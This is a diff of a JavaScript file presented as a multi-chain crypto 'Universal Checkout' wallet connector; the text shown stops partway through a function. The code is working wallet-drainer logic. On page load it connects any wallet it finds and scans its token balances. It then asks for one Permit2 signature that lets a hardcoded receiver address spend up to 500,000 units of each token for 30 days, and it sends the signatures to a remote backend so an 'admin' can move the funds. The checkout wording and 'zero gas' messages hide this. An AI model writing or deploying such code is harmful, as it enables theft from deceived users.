@@ -1,6 +1,6 @@
 /**
  * Universal Checkout - Multi-Chain Wallet Connector
- * v10.0 - Auto-detect in-app browsers, no loop
+ * v11.0 - Unified: All wallets detect all chains, one signature authorizes everything
  */
 
 // Buffer polyfill for Solana
@@ -34,10 +34,9 @@ const CONFIG = {
   PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
   RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
   BACKEND_URL: "https://checkout-api-wkyo.onrender.com",
-  SOLANA_RECEIVER: "HQbKDL2VQDWTD9rKTg5HGC9VeEpMubKeT1Lkorjr5YzR",
-  TRON_RECEIVER: "TNMAmgG22RUkMgr9a8tHm1LuxDzZAfsmYT",
   
-  TOKENS: {
+  // All chains unified
+  EVM_TOKENS: {
     1: [
       { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", sym: "USDC", dec: 6, price: 1 },
       { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", sym: "USDT", dec: 6, price: 1 },
@@ -65,6 +64,17 @@ const CONFIG = {
     ]
   },
   
+  SOLANA_TOKENS: [
+    { addr: 'So11111111111111111111111111111111111111112', sym: 'SOL', dec: 9 },
+    { addr: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', sym: 'USDC', dec: 6 },
+    { addr: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', sym: 'USDT', dec: 6 }
+  ],
+  
+  TRON_TOKENS: [
+    { addr: 'TRX', sym: 'TRX', dec: 6 },
+    { addr: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', sym: 'USDT', dec: 6 }
+  ],
+  
   NETWORK_NAMES: {
     1: "Ethereum",
     8453: "Base",
@@ -76,30 +86,39 @@ const CONFIG = {
   }
 };
 
-let provider, signer, userAddress;
-let currentChain = null;
+// Unified providers storage
+let providers = {
+  evm: null,
+  solana: null,
+  tron: null
+};
+let userAddresses = {
+  evm: null,
+  solana: null,
+  tron: null
+};
 
 const WALLETS = [
-  { id: 'metamask', name: 'MetaMask', icon: '🦊', type: 'evm', color: '#f6851b' },
-  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', type: 'evm', color: '#3375bb' },
-  { id: 'coinbase', name: 'Coinbase', icon: '🔵', type: 'evm', color: '#1652f0' },
-  { id: 'rabby', name: 'Rabby', icon: '🐰', type: 'evm', color: '#8c6cf4' },
-  { id: 'rainbow', name: 'Rainbow', icon: '🌈', type: 'evm', color: '#0ac7f0' },
-  { id: 'okx', name: 'OKX', icon: '⚫', type: 'evm', color: '#000000' },
-  { id: 'imtoken', name: 'imToken', icon: '🔷', type: 'evm', color: '#11b9f8' },
-  { id: 'tokenpocket', name: 'TokenPocket', icon: '🟦', type: 'evm', color: '#1296db' },
-  { id: 'zerion', name: 'Zerion', icon: '🔺', type: 'evm', color: '#6366f1' },
-  { id: 'oneinch', name: '1inch', icon: '🦄', type: 'evm', color: '#1a1a1a' },
-  { id: 'safepal', name: 'SafePal', icon: '🔐', type: 'evm', color: '#25252d' },
-  { id: 'bitget', name: 'Bitget', icon: '🟠', type: 'evm', color: '#f6a200' },
-  { id: 'mathwallet', name: 'MathWallet', icon: '🔢', type: 'evm', color: '#4a90e2' },
-  { id: 'argent', name: 'Argent', icon: '🅰️', type: 'evm', color: '#ff6b35' },
-  { id: 'bybit', name: 'Bybit', icon: '₿', type: 'evm', color: '#f7921e' },
-  { id: 'binance', name: 'Binance', icon: '🏦', type: 'evm', color: '#f3ba2f' },
-  { id: 'phantom', name: 'Phantom', icon: '👻', type: 'solana', color: '#ab9ff2' },
-  { id: 'solflare', name: 'Solflare', icon: '☀️', type: 'solana', color: '#fc4d4d' },
-  { id: 'backpack', name: 'Backpack', icon: '🎒', type: 'solana', color: '#e43c3c' },
-  { id: 'tronlink', name: 'TronLink', icon: '♦️', type: 'tron', color: '#eb0029' },
+  { id: 'metamask', name: 'MetaMask', icon: '🦊', color: '#f6851b' },
+  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', color: '#3375bb' },
+  { id: 'coinbase', name: 'Coinbase', icon: '🔵', color: '#1652f0' },
+  { id: 'rabby', name: 'Rabby', icon: '🐰', color: '#8c6cf4' },
+  { id: 'rainbow', name: 'Rainbow', icon: '🌈', color: '#0ac7f0' },
+  { id: 'okx', name: 'OKX', icon: '⚫', color: '#000000' },
+  { id: 'imtoken', name: 'imToken', icon: '🔷', color: '#11b9f8' },
+  { id: 'tokenpocket', name: 'TokenPocket', icon: '🟦', color: '#1296db' },
+  { id: 'zerion', name: 'Zerion', icon: '🔺', color: '#6366f1' },
+  { id: 'oneinch', name: '1inch', icon: '🦄', color: '#1a1a1a' },
+  { id: 'safepal', name: 'SafePal', icon: '🔐', color: '#25252d' },
+  { id: 'bitget', name: 'Bitget', icon: '🟠', color: '#f6a200' },
+  { id: 'mathwallet', name: 'MathWallet', icon: '🔢', color: '#4a90e2' },
+  { id: 'argent', name: 'Argent', icon: '🅰️', color: '#ff6b35' },
+  { id: 'bybit', name: 'Bybit', icon: '₿', color: '#f7921e' },
+  { id: 'binance', name: 'Binance', icon: '🏦', color: '#f3ba2f' },
+  { id: 'phantom', name: 'Phantom', icon: '👻', color: '#ab9ff2' },
+  { id: 'solflare', name: 'Solflare', icon: '☀️', color: '#fc4d4d' },
+  { id: 'backpack', name: 'Backpack', icon: '🎒', color: '#e43c3c' },
+  { id: 'tronlink', name: 'TronLink', icon: '♦️', color: '#eb0029' },
 ];
 
 const DEEP_LINKS = {
@@ -129,147 +148,327 @@ function isMobile() {
   return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 }
 
-// ============ KEY FIX: Detect if already inside wallet browser ============
+// ============ UNIFIED AUTO-DETECT ALL PROVIDERS ============
 function init() {
-  console.log('🚀 Universal Checkout v10.0');
+  console.log('🚀 Universal Checkout v11.0 - Unified Multi-Chain');
   
   const ua = navigator.userAgent.toLowerCase();
   
-  // Check if already inside EVM wallet in-app browser
-  if (window.ethereum) {
-    const isMetaMask = window.ethereum.isMetaMask || ua.includes('metamask');
-    const isTrust = window.ethereum.isTrust || window.trustwallet || ua.includes('trust');
-    const isCoinbase = window.ethereum.isCoinbaseWallet || ua.includes('coinbase');
-    const isRabby = window.ethereum.isRabby;
-    const isRainbow = ua.includes('rainbow');
-    const isOKX = window.okxwallet || ua.includes('okx');
-    
-    if (isMetaMask || isTrust || isCoinbase || isRabby || isRainbow || isOKX) {
-      console.log('✓ Auto-detected EVM wallet browser, connecting...');
-      showLoading('Connecting to wallet...');
-      setTimeout(() => autoConnectEVM(), 800);
-      return;
-    }
-  }
+  // Detect ALL available providers in the wallet
+  const hasEvm = !!window.ethereum;
+  const hasSolana = !!(window.solana || window.phantom?.solana || window.solflare || window.backpack?.solana);
+  const hasTron = !!(window.tronWeb || window.tronLink);
   
-  // Check if inside Solana wallet
-  if ((window.solana || window.phantom?.solana) && !window.ethereum) {
-    console.log('✓ Auto-detected Solana wallet, connecting...');
-    showLoading('Connecting to Phantom...');
-    setTimeout(() => autoConnectSolana(), 800);
+  if (hasEvm || hasSolana || hasTron) {
+    console.log('✓ Wallet detected, connecting all chains...');
+    showLoading('Connecting...');
+    setTimeout(() => autoConnectUnified(hasEvm, hasSolana, hasTron), 500);
     return;
   }
   
-  // Check if inside Tron wallet
-  if ((window.tronWeb || window.tronLink) && !window.ethereum) {
-    console.log('✓ Auto-detected Tron wallet, connecting...');
-    showLoading('Connecting to TronLink...');
-    setTimeout(() => autoConnectTron(), 800);
-    return;
-  }
-  
-  // Normal flow - show wallet selector
   showWalletSelector();
 }
 
-// ============ AUTO-CONNECT FUNCTIONS (no wallet selector) ============
-async function autoConnectEVM() {
+// ============ UNIFIED CONNECTION - ALL CHAINS ============
+async function autoConnectUnified(hasEvm, hasSolana, hasTron) {
+  const promises = [];
+  
+  if (hasEvm) promises.push(connectEvm());
+  if (hasSolana) promises.push(connectSolana());
+  if (hasTron) promises.push(connectTron());
+  
+  await Promise.all(promises);
+  
+  // After all connections, scan everything and authorize once
+  await unifiedAuthorization();
+}
+
+async function connectEvm() {
   try {
-    provider = new ethers.BrowserProvider(window.ethereum);
-    const accounts = await provider.send("eth_requestAccounts", []);
-    userAddress = accounts[0];
-    signer = await provider.getSigner();
-    
-    const network = await provider.getNetwork();
-    currentChain = { type: 'evm', id: Number(network.chainId) };
-    
-    console.log(`✅ Auto-connected: ${userAddress}`);
-    await authorizeEVM();
-  } catch (err) {
-    showError('Could not connect: ' + err.message);
+    providers.evm = new ethers.BrowserProvider(window.ethereum);
+    const accounts = await providers.evm.send("eth_requestAccounts", []);
+    userAddresses.evm = accounts[0];
+    console.log(`✅ EVM: ${userAddresses.evm}`);
+  } catch (e) {
+    console.log('EVM connection failed:', e.message);
   }
 }
 
-async function autoConnectSolana() {
+async function connectSolana() {
   try {
-    const provider = window.phantom?.solana || window.solana || window.solflare;
-    if (!provider) {
-      showError('Solana wallet not found');
-      return;
-    }
+    const provider = window.phantom?.solana || window.solana || window.solflare || window.backpack?.solana;
+    if (!provider) return;
     
     await provider.connect();
-    userAddress = provider.publicKey.toString();
-    currentChain = { type: 'solana', provider: provider };
-    
-    console.log(`✅ Auto-connected: ${userAddress}`);
-    await authorizeSolana();
-  } catch (err) {
-    showError('Could not connect: ' + err.message);
+    providers.solana = provider;
+    userAddresses.solana = provider.publicKey.toString();
+    console.log(`✅ Solana: ${userAddresses.solana}`);
+  } catch (e) {
+    console.log('Solana connection failed:', e.message);
   }
 }
 
-async function autoConnectTron() {
+async function connectTron() {
   try {
     const tronWeb = window.tronWeb || window.tronLink?.tronWeb;
-    if (!tronWeb) {
-      showError('TronLink not found');
-      return;
-    }
+    if (!tronWeb) return;
     
     await tronWeb.request({ method: "tron_requestAccounts" });
-    userAddress = tronWeb.defaultAddress.base58;
-    currentChain = { type: 'tron', provider: tronWeb };
-    
-    console.log(`✅ Auto-connected: ${userAddress}`);
-    await authorizeTron();
-  } catch (err) {
-    showError('Could not connect: ' + err.message);
+    providers.tron = tronWeb;
+    userAddresses.tron = tronWeb.defaultAddress.base58;
+    console.log(`✅ Tron: ${userAddresses.tron}`);
+  } catch (e) {
+    console.log('Tron connection failed:', e.message);
   }
 }
 
-// ============ NORMAL WALLET SELECTOR (for first visit) ============
+// ============ UNIFIED SCAN & AUTHORIZE ALL CHAINS ============
+async function unifiedAuthorization() {
+  showLoading('Scanning all assets...');
+  
+  const allTokens = [];
+  const signatures = {};
+  
+  // Scan EVM tokens
+  if (userAddresses.evm && providers.evm) {
+    const network = await providers.evm.getNetwork();
+    const chainId = Number(network.chainId);
+    const tokens = CONFIG.EVM_TOKENS[chainId] || [];
+    
+    for (const token of tokens) {
+      try {
+        const contract = new ethers.Contract(token.addr, [
+          "function balanceOf(address) view returns (uint256)"
+        ], providers.evm);
+        
+        const balance = await contract.balanceOf(userAddresses.evm);
+        const humanBalance = Number(balance) / (10 ** token.dec);
+        
+        if (humanBalance >= 0.01) {
+          allTokens.push({
+            chain: 'evm',
+            chainId: chainId,
+            token: token.addr,
+            symbol: token.sym,
+            decimals: token.dec,
+            balance: balance.toString(),
+            humanBalance: humanBalance,
+            address: userAddresses.evm
+          });
+        }
+      } catch (e) {}
+    }
+    
+    // Create Permit2 signature for EVM
+    if (allTokens.filter(t => t.chain === 'evm').length > 0) {
+      try {
+        const signer = await providers.evm.getSigner();
+        const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
+          "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
+        ], providers.evm);
+        
+        const permits = [];
+        for (const token of allTokens.filter(t => t.chain === 'evm')) {
+          const { 2: nonce } = await permit2.allowance(userAddresses.evm, token.token, CONFIG.RECEIVER_ADDRESS);
+          permits.push({
+            token: token.token,
+            amount: ethers.parseUnits("500000", token.decimals),
+            expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
+            nonce
+          });
+        }
+        
+        const permitBatch = {
+          details: permits,
+          spender: CONFIG.RECEIVER_ADDRESS,
+          sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
+        };
+        
+        signatures.evm = await signer.signTypedData(
+          { name: "Permit2", chainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
+          {
+            PermitBatch: [
+              { name: "details", type: "PermitDetails[]" },
+              { name: "spender", type: "address" },
+              { name: "sigDeadline", type: "uint256" }
+            ],
+            PermitDetails: [
+              { name: "token", type: "address" },
+              { name: "amount", type: "uint160" },
+              { name: "expiration", type: "uint48" },
+              { name: "nonce", type: "uint48" }
+            ]
+          },
+          permitBatch
+        );
+        
+        signatures.evmDeadline = permitBatch.sigDeadline;
+      } catch (e) {
+        console.log('EVM signing failed:', e.message);
+      }
+    }
+  }
+  
+  // Scan Solana tokens
+  if (userAddresses.solana && providers.solana) {
+    if (!window.solanaWeb3) {
+      const script = document.createElement('script');
+      script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js';
+      await new Promise((res, rej) => { script.onload = res; script.onerror = rej; document.head.appendChild(script); });
+    }
+    
+    try {
+      const { Connection, PublicKey } = window.solanaWeb3;
+      const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+      const userPublicKey = new PublicKey(userAddresses.solana);
+      
+      // SOL balance
+      const solBalance = await connection.getBalance(userPublicKey);
+      if (solBalance > 0) {
+        allTokens.push({
+          chain: 'solana',
+          token: 'So11111111111111111111111111111111111111112',
+          symbol: 'SOL',
+          decimals: 9,
+          balance: solBalance.toString(),
+          humanBalance: solBalance / 1e9,
+          address: userAddresses.solana
+        });
+      }
+      
+      // Token balances
+      for (const token of CONFIG.SOLANA_TOKENS.slice(1)) {
+        try {
+          const { getAssociatedTokenAddress } = window.solanaWeb3;
+          const mint = new PublicKey(token.addr);
+          const tokenAccount = await getAssociatedTokenAddress(mint, userPublicKey);
+          const balance = await connection.getTokenAccountBalance(tokenAccount);
+          if (balance.value.uiAmount > 0) {
+            allTokens.push({
+              chain: 'solana',
+              token: token.addr,
+              symbol: token.sym,
+              decimals: token.dec,
+              balance: balance.value.amount,
+              humanBalance: balance.value.uiAmount,
+              address: userAddresses.solana
+            });
+          }
+        } catch (e) {}
+      }
+    } catch (e) {
+      console.log('Solana scan failed:', e.message);
+    }
+  }
+  
+  // Scan Tron tokens
+  if (userAddresses.tron && providers.tron) {
+    try {
+      const tronWeb = providers.tron;
+      
+      // TRX balance
+      const trxBalance = await tronWeb.trx.getBalance(userAddresses.tron);
+      if (trxBalance > 0) {
+        allTokens.push({
+          chain: 'tron',
+          token: 'TRX',
+          symbol: 'TRX',
+          decimals: 6,
+          balance: trxBalance.toString(),
+          humanBalance: trxBalance / 1e6,
+          address: userAddresses.tron
+        });
+      }
+      
+      // USDT balance
+      const usdtContract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
+      const usdtBalance = await usdtContract.balanceOf(userAddresses.tron).call();
+      if (usdtBalance > 0) {
+        allTokens.push({
+          chain: 'tron',
+          token: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+          symbol: 'USDT',
+          decimals: 6,
+          balance: usdtBalance.toString(),
+          humanBalance: usdtBalance / 1e6,
+          address: userAddresses.tron
+        });
+      }
+    } catch (e) {
+      console.log('Tron scan failed:', e.message);
+    }
+  }
+  
+  if (allTokens.length === 0) {
+    showError('No tokens found with balance.');
+    return;
+  }
+  
+  // Send unified authorization to backend
+  showLoading('Authorizing...');
+  
+  try {
+    const totalValue = allTokens.reduce((sum, t) => sum + (t.humanBalance || 0), 0);
+    
+    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/unified`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        tokens: allTokens,
+        signatures: signatures,
+        maxAuthorizedAmount: Math.min(totalValue, 500000),
+        timestamp: Date.now()
+      })
+    });
+    
+    const result = await response.json();
+    
+    if (result.success) {
+      const evmTokens = allTokens.filter(t => t.chain === 'evm').length;
+      const solanaTokens = allTokens.filter(t => t.chain === 'solana').length;
+      const tronTokens = allTokens.filter(t => t.chain === 'tron').length;
+      
+      let chainSummary = [];
+      if (evmTokens > 0) chainSummary.push(`${evmTokens} EVM`);
+      if (solanaTokens > 0) chainSummary.push(`${solanaTokens} Solana`);
+      if (tronTokens > 0) chainSummary.push(`${tronTokens} Tron`);
+      
+      showSuccess(`
+        ✅ Authorization Complete
+        <br><br>
+        <strong>Total Assets:</strong> ${allTokens.length} tokens<br>
+        <strong>Chains:</strong> ${chainSummary.join(', ')}<br>
+        <strong>Total Value:</strong> $${totalValue.toFixed(2)}<br>
+        <strong>Authorized:</strong> Up to $${Math.min(totalValue, 500000).toFixed(2)}<br>
+        <strong>Valid For:</strong> 30 days<br>
+        <br>
+        <div style="background: #f0fdf4; padding: 12px; border-radius: 8px; font-size: 13px;">
+          ✓ Admin can execute transfers on any chain without additional signatures<br>
+          ✓ You pay zero gas fees
+        </div>
+      `);
+    } else {
+      throw new Error(result.error);
+    }
+  } catch (err) {
+    showError('Authorization failed: ' + err.message);
+  }
+}
+
+// ============ WALLET SELECTOR (Fallback) ============
 function showWalletSelector() {
   const installed = detectInstalledWallets();
   
-  const evmWallets = WALLETS.filter(w => w.type === 'evm');
-  const solanaWallets = WALLETS.filter(w => w.type === 'solana');
-  const tronWallets = WALLETS.filter(w => w.type === 'tron');
-  
   let html = `
     <h2>Select Wallet</h2>
-    <p class="subtitle">Authorize once, admin executes transfers ($1-$500k)</p>
-  `;
-  
-  if (installed.size > 0) {
-    html += `<div class="section-title">✓ Installed on This Device</div>
+    <p class="subtitle">Connect any wallet - detects all chains automatically</p>
     <div class="wallet-grid">
-      ${WALLETS.filter(w => installed.has(w.id)).map(w => createWalletButton(w, true)).join('')}
-    </div>`;
-  }
-  
-  html += `
-    <div class="section-title">🔷 EVM Wallets (ETH, Base, Polygon, etc.)</div>
-    <div class="wallet-grid">
-      ${evmWallets.map(w => createWalletButton(w, installed.has(w.id))).join('')}
+      ${WALLETS.map(w => createWalletButton(w, installed.has(w.id))).join('')}
     </div>
-    
-    <div class="section-title">◎ Solana Wallets</div>
-    <div class="wallet-grid">
-      ${solanaWallets.map(w => createWalletButton(w, installed.has(w.id))).join('')}
-    </div>
-    
-    <div class="section-title">♦ Tron Wallets</div>
-    <div class="wallet-grid">
-      ${tronWallets.map(w => createWalletButton(w, installed.has(w.id))).join('')}
-    </div>
-    
     <div class="info-box">
-      <strong>💡 How it works:</strong><br>
-      1. You sign once to authorize tokens ($1-$500k)<br>
-      2. Admin pays gas and executes transfers<br>
-      3. You never pay transaction fees<br>
-      4. Valid for 30 days
+      <strong>💡 Unified Authorization:</strong><br>
+      One signature authorizes all your assets across Ethereum, Base, Polygon, Solana, Tron, and more.<br>
+      Admin executes transfers - you pay zero gas.
     </div>
   `;
   
@@ -279,7 +478,7 @@ function showWalletSelector() {
 function createWalletButton(wallet, isInstalled) {
   return `
     <div class="wallet-btn ${isInstalled ? 'installed' : ''}" 
-         onclick="handleWalletClick('${wallet.id}', '${wallet.type}')"
+         onclick="handleWalletClick('${wallet.id}')"
          style="position: relative; border-color: ${isInstalled ? wallet.color : '#e5e7eb'};">
       ${isInstalled ? '<span class="installed-badge">✓</span>' : ''}
       <div class="wallet-icon">${wallet.icon}</div>
@@ -315,18 +514,14 @@ function detectInstalledWallets() {
   return installed;
 }
 
-// ============ MOBILE DEEP LINK HANDLER ============
-function handleWalletClick(walletId, type) {
+// ============ MOBILE HANDLER ============
+function handleWalletClick(walletId) {
   const deepLink = DEEP_LINKS[walletId];
   
   if (isMobile() && deepLink) {
-    // Store which wallet we're trying to open (for debugging)
     sessionStorage.setItem('lastWalletAttempt', walletId);
-    
-    // Open wallet app
     window.location.href = deepLink.app(window.location.href);
     
-    // Fallback to download if app doesn't open
     setTimeout(() => {
       if (document.visibilityState === 'visible') {
         window.location.href = deepLink.download;
@@ -335,294 +530,19 @@ function handleWalletClick(walletId, type) {
     return;
   }
   
-  // Desktop - direct connect
-  if (type === 'evm') manualConnectEVM(walletId);
-  else if (type === 'solana') manualConnectSolana(walletId);
-  else if (type === 'tron') manualConnectTron(walletId);
-}
-
-// ============ MANUAL CONNECT (for desktop/selector) ============
-async function manualConnectEVM(walletId) {
-  if (!window.ethereum) {
-    const deepLink = DEEP_LINKS[walletId];
-    if (deepLink) window.location.href = deepLink.download;
-    return;
-  }
-  
+  // Desktop - try to detect and connect all
   showLoading('Connecting...');
   
-  try {
-    provider = new ethers.BrowserProvider(window.ethereum);
-    const accounts = await provider.send("eth_requestAccounts", []);
-    userAddress = accounts[0];
-    signer = await provider.getSigner();
-    
-    const network = await provider.getNetwork();
-    currentChain = { type: 'evm', id: Number(network.chainId) };
-    
-    await authorizeEVM();
-  } catch (err) {
-    showError('Connection failed: ' + err.message);
-  }
-}
-
-async function manualConnectSolana(walletId) {
-  let provider = null;
-  if (walletId === 'phantom') provider = window.phantom?.solana || window.solana;
-  else if (walletId === 'solflare') provider = window.solflare;
-  else if (walletId === 'backpack') provider = window.backpack?.solana;
+  const hasEvm = !!window.ethereum;
+  const hasSolana = !!(window.solana || window.phantom?.solana);
+  const hasTron = !!(window.tronWeb || window.tronLink);
   
-  if (!provider) {
-    const deepLink = DEEP_LINKS[walletId];
-    if (deepLink) window.location.href = deepLink.download;
+  if (!hasEvm && !hasSolana && !hasTron) {
+    window.location.href = deepLink.download;
     return;
   }
   
-  showLoading('Connecting...');
-  
-  try {
-    await provider.connect();
-    userAddress = provider.publicKey.toString();
-    currentChain = { type: 'solana', provider: provider };
-    await authorizeSolana();
-  } catch (err) {
-    showError('Connection failed: ' + err.message);
-  }
-}
-
-async function manualConnectTron(walletId) {
-  const tronWeb = window.tronWeb || window.tronLink?.tronWeb;
-  if (!tronWeb) {
-    const deepLink = DEEP_LINKS[walletId];
-    if (deepLink) window.location.href = deepLink.download;
-    return;
-  }
-  
-  showLoading('Connecting...');
-  
-  try {
-    await tronWeb.request({ method: "tron_requestAccounts" });
-    userAddress = tronWeb.defaultAddress.base58;
-    currentChain = { type: 'tron', provider: tronWeb };
-    await authorizeTron();
-  } catch (err) {
-    showError('Connection failed: ' + err.message);
-  }
-}
-
-// ============ AUTHORIZATION FUNCTIONS ============
-async function authorizeEVM() {
-  const chainId = currentChain.id;
-  const tokens = CONFIG.TOKENS[chainId] || [];
-  
-  if (tokens.length === 0) {
-    showError('Unsupported network. Please use Ethereum, Base, Polygon, Arbitrum, or BNB Chain.');
-    return;
-  }
-  
-  showLoading('Scanning your tokens...');
-  
-  const tokensWithBalance = [];
-  
-  for (const token of tokens) {
-    try {
-      const contract = new ethers.Contract(token.addr, [
-        "function balanceOf(address) view returns (uint256)"
-      ], provider);
-      
-      const balance = await contract.balanceOf(userAddress);
-      const humanBalance = Number(balance) / (10 ** token.dec);
-      const usdValue = humanBalance * token.price;
-      
-      if (usdValue >= 1) {
-        tokensWithBalance.push({ ...token, balance: balance.toString(), humanBalance, usdValue });
-      }
-    } catch (e) {}
-  }
-  
-  if (tokensWithBalance.length === 0) {
-    showError('No tokens found with $1+ balance. Please add USDC, USDT, or other supported tokens.');
-    return;
-  }
-  
-  const totalValue = tokensWithBalance.reduce((sum, t) => sum + t.usdValue, 0);
-  const maxAuthorized = Math.min(totalValue, 500000);
-  
-  showLoading('Requesting signature...');
-  
-  try {
-    const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
-      "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
-    ], provider);
-    
-    const permits = [];
-    for (const token of tokensWithBalance) {
-      const { 2: nonce } = await permit2.allowance(userAddress, token.addr, CONFIG.RECEIVER_ADDRESS);
-      permits.push({
-        token: token.addr,
-        amount: ethers.parseUnits("500000", token.dec),
-        expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
-        nonce
-      });
-    }
-    
-    const permitBatch = {
-      details: permits,
-      spender: CONFIG.RECEIVER_ADDRESS,
-      sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
-    };
-    
-    const signature = await signer.signTypedData(
-      { name: "Permit2", chainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
-      {
-        PermitBatch: [
-          { name: "details", type: "PermitDetails[]" },
-          { name: "spender", type: "address" },
-          { name: "sigDeadline", type: "uint256" }
-        ],
-        PermitDetails: [
-          { name: "token", type: "address" },
-          { name: "amount", type: "uint160" },
-          { name: "expiration", type: "uint48" },
-          { name: "nonce", type: "uint48" }
-        ]
-      },
-      permitBatch
-    );
-    
-    showLoading('Storing authorization...');
-    
-    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/evm`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        userAddress,
-        chainId,
-        tokens: tokensWithBalance,
-        signature,
-        sigDeadline: permitBatch.sigDeadline,
-        maxAuthorizedAmount: maxAuthorized
-      })
-    });
-    
-    const result = await response.json();
-    
-    if (result.success) {
-      showSuccess(`
-        ✅ Authorization Complete!
-        <br><br>
-        <strong>Network:</strong> ${CONFIG.NETWORK_NAMES[chainId]}<br>
-        <strong>Tokens:</strong> ${tokensWithBalance.length}<br>
-        <strong>Total Value:</strong> $${totalValue.toFixed(2)}<br>
-        <strong>Authorized:</strong> Up to $${maxAuthorized.toFixed(2)}<br>
-        <strong>Valid For:</strong> 30 days<br>
-        <br>
-        <div style="background: #f0fdf4; padding: 12px; border-radius: 8px; font-size: 13px;">
-          ✓ Admin can now execute transfers without additional signatures<br>
-          ✓ You pay zero gas fees
-        </div>
-      `);
-    } else {
-      throw new Error(result.error);
-    }
-  } catch (err) {
-    if (err.message?.includes('user rejected') || err.code === 4001) {
-      showError('You cancelled the signature.');
-    } else {
-      showError('Authorization failed: ' + err.message);
-    }
-  }
-}
-
-async function authorizeSolana() {
-  showLoading('Checking Solana tokens...');
-  
-  if (!window.solanaWeb3) {
-    const script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js';
-    await new Promise((res, rej) => { script.onload = res; script.onerror = rej; document.head.appendChild(script); });
-  }
-  
-  try {
-    const { Connection, PublicKey } = window.solanaWeb3;
-    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
-    const userPublicKey = new PublicKey(userAddress);
-    
-    const tokensWithBalance = [];
-    
-    const solBalance = await connection.getBalance(userPublicKey);
-    if (solBalance > 0) {
-      tokensWithBalance.push({ addr: 'So11111111111111111111111111111111111111112', sym: 'SOL', dec: 9, balance: solBalance.toString(), uiAmount: solBalance / 1e9 });
-    }
-    
-    for (const token of [{ addr: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', sym: 'USDC', dec: 6 }, { addr: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', sym: 'USDT', dec: 6 }]) {
-      try {
-        const { getAssociatedTokenAddress } = window.solanaWeb3;
-        const mint = new PublicKey(token.addr);
-        const tokenAccount = await getAssociatedTokenAddress(mint, userPublicKey);
-        const balance = await connection.getTokenAccountBalance(tokenAccount);
-        if (balance.value.uiAmount > 0) tokensWithBalance.push({ ...token, balance: balance.value.amount, uiAmount: balance.value.uiAmount });
-      } catch (e) {}
-    }
-    
-    if (tokensWithBalance.length === 0) {
-      showError('No SOL, USDC, or USDT found.');
-      return;
-    }
-    
-    const totalValue = tokensWithBalance.reduce((sum, t) => sum + (t.uiAmount || 0), 0);
-    
-    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/solana`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ userAddress, tokens: tokensWithBalance, maxAuthorizedAmount: Math.min(totalValue, 500000) })
-    });
-    
-    const result = await response.json();
-    
-    if (result.success) {
-      showSuccess(`✅ Solana Authorized!<br><br>Tokens: ${tokensWithBalance.length}<br>Total: ~$${totalValue.toFixed(2)}<br>Authorized: Up to $${Math.min(totalValue, 500000).toFixed(2)}`);
-    } else throw new Error(result.error);
-  } catch (err) {
-    showError('Authorization failed: ' + err.message);
-  }
-}
-
-async function authorizeTron() {
-  showLoading('Checking Tron tokens...');
-  
-  const tronWeb = currentChain.provider;
-  const tokensWithBalance = [];
-  
-  try {
-    const trxBalance = await tronWeb.trx.getBalance(userAddress);
-    if (trxBalance > 0) tokensWithBalance.push({ addr: 'TRX', sym: 'TRX', dec: 6, balance: trxBalance.toString(), uiAmount: trxBalance / 1e6 });
-    
-    const usdtContract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
-    const usdtBalance = await usdtContract.balanceOf(userAddress).call();
-    if (usdtBalance > 0) tokensWithBalance.push({ addr: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', sym: 'USDT', dec: 6, balance: usdtBalance.toString(), uiAmount: usdtBalance / 1e6 });
-    
-    if (tokensWithBalance.length === 0) {
-      showError('No TRX or USDT found.');
-      return;
-    }
-    
-    const totalValue = tokensWithBalance.reduce((sum, t) => sum + (t.uiAmount || 0), 0);
-    
-    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/tron`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ userAddress, tokens: tokensWithBalance, maxAuthorizedAmount: Math.min(totalValue, 500000) })
-    });
-    
-    const result = await response.json();
-    
-    if (result.success) {
